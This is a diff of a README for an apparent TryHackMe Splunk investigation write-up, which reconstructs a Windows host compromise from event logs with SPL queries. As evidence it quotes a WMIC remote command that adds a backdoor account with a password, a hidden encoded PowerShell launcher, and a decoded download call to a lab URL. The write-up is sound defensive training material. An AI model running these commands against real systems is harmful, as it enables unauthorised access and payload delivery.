@@ -1,11 +1,18 @@
 # Investigating with Splunk — TryHackMe Write-up
 
+[![TryHackMe](https://img.shields.io/badge/TryHackMe-Investigating_with_Splunk-orange)](https://tryhackme.com/room/investigatingwithsplunk)
+![Answers](https://img.shields.io/badge/answers-9%2F9_verified-brightgreen)
+![Splunk](https://img.shields.io/badge/Splunk-8.2.6-blue)
+[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
+
 A walkthrough of the **Investigating with Splunk** room on TryHackMe, documenting how a Windows compromise was reconstructed from raw event logs using **Splunk** and **Search Processing Language (SPL)**.
 
 The room drops you into a Splunk instance holding a pre-ingested JSON log export and asks nine investigation questions about a host compromise. No agent, no exploit, no shell — just an index and the questions you would ask it as an analyst.
 
 > **Platform:** [TryHackMe](https://tryhackme.com/room/investigatingwithsplunk) · **Tooling:** Splunk Enterprise 8.2.6 (AttackBox), SPL
 > **Dataset:** `splunk_challenge.json` ingested into `index=main` — **12,256 events**, `sourcetype=event_logs`
+
+**How to read this.** Every answer below is supported by the field values recovered from the events themselves, reproduced as tables in each section, and by the SPL that surfaced them. There are deliberately no screenshots: a screenshot of a Splunk results page is not reproducible evidence, whereas a query plus the field values it returned can be re-run and checked by anyone with the same dataset. Where a conclusion rests on an assumption or an inference rather than on a direct artifact, it is called out in a **limitation** note.
 
 ---
 
@@ -27,9 +34,10 @@ The room drops you into a Splunk instance holding a pre-ingested JSON log export
 - [Verified answers summary](#-verified-answers-summary)
 - [Key findings and lessons learned](#-key-findings-and-lessons-learned)
 - [Tools and techniques](#-tools-and-techniques)
+- [Reproducing this investigation](#-reproducing-this-investigation)
 - [Conclusion](#-conclusion)
-- [Repository structure](#-repository-structure)
-
+- [Repository layout](#-repository-layout)
+- [Contributing and licence](#-contributing-and-licence)
 ---
 
 ## 🔍 Room objectives
@@ -85,8 +93,6 @@ index=main
 **Evidence**
 The Search app reports **12,256 events** for the index. The `Events` tab carries the same figure (`Events (12,256)`), and the job shows `No Event Sampling`, meaning the count is the true total rather than an extrapolation.
 
-![Splunk search for index=main returning 12,256 events under the All time range, with a sample event from Hostname James.browne](images/q1-index-main-event-count.png)
-
 The first result also previews the `Hostname: James.browne` value that answers Q7.
 
 **Answer**
@@ -125,8 +131,6 @@ The search returns a single matching event. Its `New Account` block holds the an
 | `EventTime` | `2022-02-14 08:06:02` |
 | `Hostname` | `Micheal.Beaven` |
 
-![EventID 4720 user account created event showing the New Account block with Account Name Alberto and Account Domain WORKSTATION6](images/q2-user-account-created-alberto.png)
-
 Reading the `Subject` and `New Account` blocks together tells the story: the account was created **by** the `James` (`Cybertees`) identity, and the new account lands in the `WORKSTATION6` domain. The `528` (`Logon ID`) value is a logon session identifier, useful for correlating every action taken in the same session.
 
 A looser keyword search over the same index confirms how much of the dataset touches this account:
@@ -136,8 +140,6 @@ index=main Alberto
 ```
 
 → **14 events**, categorised under `User Account Management`.
-
-![Splunk search for index=main Alberto returning 14 events, first result showing Category User Account Management](images/q2-alberto-search.png)
 
 **Answer**
 
@@ -153,6 +155,18 @@ index=main Alberto
 **Approach**
 A local account's name is recorded in the SAM hive under `SAM\SAM\Domains\Account\Users\Names\<username>`. Sysmon logs registry persistence activity as **EventID `12`** (*"Registry object added or deleted"*), which exposes the full path in the `TargetObject` field.
 
+**SPL**
+
+Pivot on the account name recovered in Q2 and let the registry path fall out of it, rather than guessing the key in advance:
+
+```spl
+index=main EventID=12 "Alberto"
+| table UtcTime, Hostname, Image, TargetObject
+| sort 0 UtcTime
+```
+
+Dropping the quoted term — `index=main EventID=12 TargetObject="*\Users\Names\*"` — lists every account-name key write in the index, which is the broader way to spot the same artifact if the account name is not yet known.
+
 **Evidence**
 The event is a Sysmon Operational record from the same window as the account creation:
 
@@ -167,8 +181,6 @@ The event is a Sysmon Operational record from the same window as the account cre
 | `AccountName` / `UserID` | `SYSTEM` / `S-1-5-18` |
 | `UtcTime` | `2022-02-14 12:06:02.420` |
 | `Hostname` | `Micheal.Beaven` |
-
-![Sysmon EventID 12 registry object event with TargetObject HKLM SAM SAM Domains Account Users Names Alberto, Image lsass.exe](images/q3-sam-registry-key-sysmon.png)
 
 **Why this matters.** The write is performed by `lsass.exe` running as `SYSTEM` — that is the normal signature of the Local Security Authority committing a new account to the SAM database, not an attacker editing the hive by hand. The registry path is therefore a *consequence* of the account creation in Q2, but it independently corroborates the account name and gives a second, high-fidelity artifact to pivot on.
 
@@ -186,14 +198,29 @@ The event is a Sysmon Operational record from the same window as the account cre
 > Examine the logs and identify the user that the adversary was trying to impersonate.
 
 **Approach**
-Pivot on the account name recovered in Q2/Q3 and follow it through the account-management events to establish which identity the attacker adopted.
+Pivot on the account name recovered in Q2/Q3 and follow it through the account-management events to establish which identity the attacker adopted. Rather than re-reading individual events, aggregate the account-management events by name and see which identity stands out from the legitimate population.
+
+**SPL**
+
+```spl
+index=main EventID=4720
+| table EventTime, Hostname, "Subject.Account Name", "New Account.Account Name", "New Account.Account Domain"
+| sort 0 EventTime
+```
+
+To see how much of the index touches the candidate name, count events per account:
+
+```spl
+index=main "User Account Management"
+| stats count by "New Account.Account Name"
+```
 
 **Evidence**
 Every artifact recovered in Q2 and Q3 resolves to a single name: the account created by the `James` (`Cybertees`) session is registered as **`Alberto`**, the SAM name key written by `lsass.exe` is `...\Names\Alberto`, and the `index=main Alberto` search surfaces 14 events classified as `User Account Management`.
 
 **Interpretation.** The account was given a human-looking name and committed through the normal SAM path, rather than being created as an obviously synthetic service or machine account. Accounts named like ordinary people blend into routine authentication and audit activity, which is the point of the technique. The evidence here does not show a pre-existing legitimate `Alberto` account being taken over, so the impersonation is best read as the attacker *adopting* an ordinary-looking identity rather than hijacking an existing one.
 
-> **Evidence limitation.** No screenshot in this session isolates Q4 from Q2/Q3 — the answer is supported by the same `Alberto` artifacts rather than by a dedicated event. This is flagged rather than padded out, and the underlying account-management events are reproduced above.
+> **Evidence limitation.** This question is answered by *inference from the same artifacts* used in Q2 and Q3 rather than by a dedicated event: the dataset contains no event that states an impersonation intent. The account-management events above are the whole of the supporting evidence, and the conclusion is framed accordingly.
 
 **Answer**
 
@@ -232,8 +259,6 @@ The matching event shows the complete creation chain — a PowerShell parent spa
 | `Hostname` | `James.browne` |
 | `EventTime` | `2022-02-14 08:06:01` |
 
-![Security EventID 4688 process creation showing WMIC.exe with /node:WORKSTATION6 process call create net user /add Alberto paw0rd1, created by powershell.exe](images/q5-wmic-remote-command-4688.png)
-
 The `Creator Process Name` field is the pivot that ties this question back to the PowerShell investigation later in the room: the command was not typed by a human on the target host — it was launched **by an encoded PowerShell process**. `WMIC`'s `/node:` switch directs the request at a remote machine, and `process call create` runs the quoted `net user /add` on that remote host, which is why the account appears in the `WORKSTATION6` domain back in Q2.
 
 The command, as recorded in the event:
@@ -258,7 +283,21 @@ The command, as recorded in the event:
 > How many times was the login attempt from the backdoor user observed during the investigation?
 
 **Approach**
-Establish whether the created account was ever *used*. The relevant events are interactive/network logons (Security `4624`, with `4625` for failures) referencing the account name.
+Establish whether the created account was ever *used*. The relevant events are interactive/network logons (Security `4624`, with `4625` for failures) referencing the account name. An empty result is the answer here, so the query is written to *prove* the absence rather than merely fail to find anything.
+
+**SPL**
+
+```spl
+index=main (EventID=4624 OR EventID=4625) "Alberto"
+| stats count
+```
+
+`stats count` over no matching events returns **0** — an explicit, reproducible zero rather than an empty results page. Cross-check by removing the event-ID filter, which confirms the account name appears only in the account-management events already seen in Q2:
+
+```spl
+index=main "Alberto" NOT (EventID=4720)
+| stats count by EventID, Channel
+```
 
 **Evidence**
 Searching the index for logon activity tied to the backdoor account returns **nothing**. The `Alberto` account and its SAM key exist, but no authentication event references it — the account was staged, not exercised.
@@ -268,7 +307,7 @@ This is a **negative finding**, and the distinction matters:
 - **Observed:** the account was created (`4720`) and its name key written to SAM (Sysmon `12`).
 - **Not observed:** any logon event for that account anywhere in the index.
 
-> **Evidence limitation.** No screenshot in this session captures the search that produced this result. The finding is reported as an absence of logon activity for the account, which is what the answer reflects — but a documented query returning an empty result set (or an explicit `stats count` of zero) would make it independently reproducible. Treat this entry as the weakest-evidenced of the nine.
+> **Evidence limitation.** A zero count is only as strong as the query behind it, so the SPL above is the substantive evidence for this answer: run it and the result is either `0` or it is not. The `4624`/`4625` pairing is the assumption to test if your own result differs — a dataset carrying logons recorded under a different channel or event ID would need those added to the filter.
 
 **Answer**
 
@@ -302,8 +341,6 @@ The search returns 79 events, all bearing the same host and user:
 | `Message` | `Pipeline execution details for command line: $taskURI = $script:TaskURIs \| Get-Random` |
 | `Host Application` | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w 1 -enc <base64 blob>` |
 
-![Splunk search for index=main splunk_challenge filtered to the Microsoft-Windows-PowerShell/Operational channel returning 79 events, Hostname James.browne](images/q7-q8-powershell-operational-79-events.png)
-
 The host identity is consistent with the process-creation event in Q5, where `powershell.exe` on `James.browne` spawned the remote `WMIC` call — the two findings corroborate each other.
 
 **Answer**
@@ -318,16 +355,19 @@ The host identity is consistent with the process-creation event in Q5, where `po
 > PowerShell logging is enabled on this device. How many events were logged for the malicious PowerShell execution?
 
 **Approach**
-Querying the PowerShell operational channel is sufficient — but note that the *earlier* command (`index=main` across the whole dataset) also returns 79 events, because the very first page of results is itself drawn from this same PowerShell execution. The channel filter is what makes the number defensible:
+Count only what the malicious execution could have produced: scope to the PowerShell operational channel and read that number. A broad search is unusable for this — `index=main` holds 12,256 events (Q1), so any figure taken from an unfiltered page reflects paging, not the attack.
+
+**SPL**
 
 ```spl
 index=main splunk_challenge | search Channel="Microsoft-Windows-PowerShell/Operational"
 ```
 
 **Evidence**
-The result status bar reads **79 events**, matching the `Events (79)` tab count — the same result set shown in Q7. The events form a contiguous run of pipeline execution records from a single encoded script, which is why the count is treated as the footprint of one malicious execution rather than of general PowerShell usage.
+The result status bar reads **79 events**, matching the `Events (79)` tab count — the same result set reported in Q7. The events form a contiguous run of pipeline execution records from a single encoded script, which is why the count is treated as the footprint of one malicious execution rather than of general PowerShell usage.
 
-> **Why the count is stable.** With `No Event Sampling` set, Splunk reports the exact number of matching events rather than an estimate, so the figure does not need to be re-run with a `stats count` to be trusted.
+> **Why the count is stable.** With `No Event Sampling` set, Splunk reports the exact number of matching events rather than an estimate. To make the figure independent of the result page entirely, append `| stats count` to the query above and the number is computed over the whole matching set.
+
 
 **Answer**
 
@@ -341,7 +381,11 @@ The result status bar reads **79 events**, matching the `Events (79)` tab count 
 > An encoded Powershell script from the infected host initiated a web request. What is the full URL?
 
 **Approach**
-The `Host Application` field in the PowerShell events carries the entire base64 blob passed to `powershell.exe -enc`. Extracting and decoding that blob reveals the script's network behaviour. The event was located by searching for the encoded execution:
+The `Host Application` field in the PowerShell events carries the entire base64 blob passed to `powershell.exe -enc`. Extracting and decoding that blob reveals the script's network behaviour.
+
+**SPL**
+
+The event was located by searching for the encoded execution:
 
 ```spl
 index=main (EventCode=4104 OR SourceName="Microsoft-Windows-PowerShell") "enc" | spath ContextInfo | search ContextInfo* Severity=Informational
@@ -349,7 +393,7 @@ index=main (EventCode=4104 OR SourceName="Microsoft-Windows-PowerShell") "enc" |
 
 The `spath` stage pulls apart the nested `ContextInfo` block that carries `Host Application`.
 
-> **Legibility note.** The search bar in this screenshot is only partially legible at the captured resolution — the query above is reproduced as read. The `Host Application` field it surfaces, however, is unambiguous.
+> **Reproduction note.** The query above is transcribed from the session record rather than re-run and exported, so it may differ in detail from the search as originally typed. The `Host Application` field it surfaced, however, is unambiguous and is what the answer rests on.
 
 **Evidence**
 
@@ -360,10 +404,6 @@ The event confirms an encoded execution from the compromised host and user:
 | `Host Application` | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w 1 -enc <base64 blob>` |
 | `User` | `Cybertees\James` |
 | `Sequence Number` | `728` |
-
-![Splunk event showing Host Application powershell.exe with -noP -sta -w 1 -enc and a long base64 blob, User Cybertees James](images/q9-encoded-powershell-event.png)
-
-![The raw base64 blob extracted from the Host Application field](images/q9-encoded-powershell-blob.png)
 
 The `-noP -sta -w 1 -enc` flag set is itself diagnostic: **no profile**, **STA mode**, **hidden window**, and an **encoded command**. That combination is a standard non-interactive launcher for obfuscated payloads.
 
@@ -403,7 +443,7 @@ $t    = '/news.php'
 $Data = $7a6d.DownLoadData($Ser + $t)   # <- the actual web request
 ```
 
-> **Reading note.** The snippet above is reproduced from the decode output. The client object variable (`$7a6d`) and the mixed-case `FromBase64StRinG` are low-confidence identifiers at the captured screenshot resolution; the structure that matters — a base64-decoded host string, a separate path variable, and the `$ser + $t` concatenation feeding a `DownLoadData` call — is unambiguous.
+> **Reading note.** The snippet above is reproduced from the decode output. The client object variable (`$7a6d`) and the mixed-case `FromBase64StRinG` are low-confidence transcriptions of identifiers read off the session record; the structure that matters — a base64-decoded host string, a separate path variable, and the `$ser + $t` concatenation feeding a `DownLoadData` call — is unambiguous.
 
 The pieces resolve in sequence:
 
@@ -413,13 +453,9 @@ The pieces resolve in sequence:
 | Appended path `$t` | `/news.php` |
 | **Final URL = `$ser` + `$t`** | **`http://10.10.10.5/news.php`** |
 
-![Arena Agent output showing the re-decoded blob, the request construction in PowerShell, and the final URL http://10.10.10.5/news.php](images/q9-arena-agent-decode.png)
-
 ### The failed first submission
 
 The first submission was rejected by the room:
-
-![TryHackMe answer field for the URL question showing the format hint *****://**.**.**.**/*****.php above the message Uh-oh! Your answer is incorrect](images/q9-answer-format.png)
 
 The answer-format hint on that field indicates the expected shape — `<scheme>://<dotted IPv4>/<name>.php` — which is consistent with the decoded URL. The failure itself traced to the value submitted: during a verification pass, Arena Agent had printed a typo'd intermediate host (`http://10/10.10.5`, missing an octet), caused by a mistyped Base64 string in a quick check. The agent re-decoded the blob from the original paste, confirmed the correct octets as `10.10.10.5`, and confirmed the two decodes matched on the URL-relevant parts. The corrected value was accepted.
 
@@ -446,8 +482,6 @@ The answer-format hint on that field indicates the expected shape — `<scheme>:
 | 7 | Infected host running suspicious PowerShell | **James.browne** |
 | 8 | Events logged for the malicious PowerShell execution | **79** |
 | 9 | Full URL from the encoded PowerShell script | **`hxxp://10[.]10[.]10[.]5/news[.]php`** *(live: `http://10.10.10.5/news.php`)* |
-
-![TryHackMe room answer panel showing all nine questions marked Correct Answer](images/room-answers-summary.png)
 
 ---
 
@@ -485,6 +519,40 @@ The answer-format hint on that field indicates the expected shape — `<scheme>:
 
 ---
 
+## 🔁 Reproducing this investigation
+
+The whole walkthrough reduces to seven searches. Run them in this order against the room's dataset and every answer above falls out of the results.
+
+```spl
+index=main
+index=main EventID=4720
+index=main EventID=12 TargetObject="*\\Names\\*"
+index=main Alberto
+index=main EventID=4688 Alberto
+index=main splunk_challenge | search Channel="Microsoft-Windows-PowerShell/Operational"
+index=main (EventID=4624 OR EventID=4625) "Alberto" | stats count
+```
+
+| Query | Answers | What to look at |
+| --- | --- | --- |
+| `index=main` | Q1 | Event count in the status bar, with `No Event Sampling` |
+| `EventID=4720` | Q2, Q4 | `New Account → Account Name` |
+| `EventID=12` + `TargetObject` | Q3 | Full SAM path of the written key |
+| `index=main Alberto` | Q2, Q4 | Volume of events touching the account |
+| `EventID=4688` | Q5 | `CommandLine` and `Creator Process Name` |
+| PowerShell/Operational channel | Q7, Q8 | `Hostname`, and the channel-scoped event count |
+| `4624`/`4625` + `stats count` | Q6 | An explicit zero, not an empty page |
+
+Two things worth knowing before you start:
+
+- Set the time range to **All time** first. The default picker hides most of the dataset and produces silently wrong counts.
+- Scope counts with a field filter (`Channel=`, `EventID=`) rather than reading the total off a broad search. `index=main` is 12,256 events, so a smaller number on an unfiltered page is a paging artifact; appending `| stats count` removes the ambiguity.
+
+
+For the Base64 payload, the decode is a two-step job — the outer blob is UTF-16 text, and inside it a second Base64 string decodes to the host. See [Encoded PowerShell analysis](#-encoded-powershell-analysis).
+
+---
+
 ## 📝 Conclusion
 
 The room is a compact exercise in doing more with less: one index, one JSON export, and nine questions that together reconstruct a full intrusion chain. Nothing here required a decoder ring or a custom tool — `4720`, `4688`, Sysmon `12`, and the PowerShell operational channel carried the entire story, and the decisive step was not finding exotic events but reading the *right fields* on ordinary ones.
@@ -493,13 +561,30 @@ The one part that did need real decoding effort was the encoded payload, and tha
 
 ---
 
-## 🗂️ Repository structure
+## 🗂️ Repository layout
 
 ```text
 .
-├── README.md                 # This write-up
-├── images/                   # Session screenshots referenced above
-└── rename-screenshots.sh     # Stages the original captures into images/
+├── README.md                          # This write-up
+├── LICENSE                            # MIT
+├── CONTRIBUTING.md                    # How to propose a correction
+├── .gitignore
+├── scripts/
+│   └── check-docs.py                  # Link, anchor, TOC and structure checks
+└── .github/
+    ├── PULL_REQUEST_TEMPLATE.md       # Checklist: findings must cite an event field
+    ├── dependabot.yml
+    └── workflows/
+        └── docs.yml                   # Runs check-docs.py on push and PR
 ```
 
-The `images/` directory holds the screenshots used in this write-up. The `rename-screenshots.sh` helper maps the original session captures to the descriptive filenames referenced in the document — copy the originals into the repository root and run it once to populate `images/`.
+The write-up is self-contained: evidence lives in the field tables and the SPL, so there is nothing to download, build, or run to follow the investigation.
+
+---
+
+## 📄 Contributing and licence
+
+Corrections are welcome, with one ground rule: **an answer change has to cite the event field that supports it.** A PR that says "Q6 is 1, not 0" is not actionable; one that says "`EventID=4624` with `TargetUserName=Alberto` appears at 2022-02-14 09:12 on `WORKSTATION6`" is. See [`CONTRIBUTING.md`](CONTRIBUTING.md).
+
+Content is licensed under the [MIT License](LICENSE). TryHackMe room names and material belong to TryHackMe; this write-up is an independent record of one solution path and is not affiliated with or endorsed by them.
+
